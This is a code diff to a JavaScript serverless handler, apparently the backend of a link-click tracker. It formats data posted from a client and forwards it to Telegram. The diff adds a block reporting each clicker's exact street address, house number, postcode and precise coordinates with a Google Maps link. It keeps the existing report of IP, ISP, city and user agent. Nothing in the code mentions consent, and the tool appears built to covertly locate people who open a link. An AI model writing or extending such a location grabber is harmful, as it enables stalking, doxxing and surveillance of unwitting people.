@@ -37,24 +37,50 @@ export default async function handler(req, res) {
     const data = req.body;
     console.log("Received data:", data);
 
-    // Simple message format to avoid Markdown issues
-    const message = `🎯 New Click Tracked
-
-📍 Location Info:
-• IP: ${data.ip || "Unknown"}
-• City: ${data.city || "Unknown"}
-• Region: ${data.region || "Unknown"} 
-• Country: ${data.country || "Unknown"}
-• Timezone: ${data.timezone || "Unknown"}
-
-🌐 Technical Info:
-• ISP: ${data.isp || "Unknown"}
-• Coordinates: ${data.latitude || "N/A"}, ${data.longitude || "N/A"}
-• User Agent: ${
-      data.userAgent ? data.userAgent.substring(0, 80) + "..." : "Unknown"
+    // Format exact address if available
+    let exactLocationInfo = "";
+    if (data.exactAddress) {
+      const addr = data.exactAddress;
+      exactLocationInfo = `
+  
+  📍 Exact Location (${
+    data.accuracy ? `±${Math.round(data.accuracy)}m` : "High Accuracy"
+  }):
+  • Address: ${[addr.road, addr.house_number].filter(Boolean).join(" ")}
+  • Neighborhood: ${addr.neighbourhood || "N/A"}
+  • City: ${addr.city || addr.town || addr.village || "N/A"}
+  • State: ${addr.state || "N/A"}
+  • Postcode: ${addr.postcode || "N/A"}
+  • Country: ${addr.country || "N/A"}
+  • Google Maps: https://www.google.com/maps?q=${data.exactLatitude},${
+        data.exactLongitude
+      }`;
     }
 
-⏰ Timestamp: ${data.timestamp || new Date().toISOString()}`;
+    // Simple message format to avoid Markdown issues
+    const message = `🎯 New Click Tracked
+  
+  📍 IP Location Info:
+  • IP: ${data.ip || "Unknown"}
+  • City: ${data.city || "Unknown"}
+  • Region: ${data.region || "Unknown"}
+  • Country: ${data.country || "Unknown"}
+  • Postal Code: ${data.postal || "N/A"}
+  • Timezone: ${data.timezone || "Unknown"}
+  • Coordinates: ${data.latitude || "N/A"}, ${data.longitude || "N/A"}
+  • Google Maps: https://www.google.com/maps?q=${data.latitude},${
+      data.longitude
+    }
+  
+  🌐 Network & Device:
+  • ISP: ${data.isp || "Unknown"}
+  • User Agent: ${
+    data.userAgent ? data.userAgent.substring(0, 80) + "..." : "Unknown"
+  }
+  
+  ⏰ Timestamp: ${data.timestamp || new Date().toISOString()}
+  
+  ${exactLocationInfo}`;
 
     console.log("Sending to Telegram...");
 
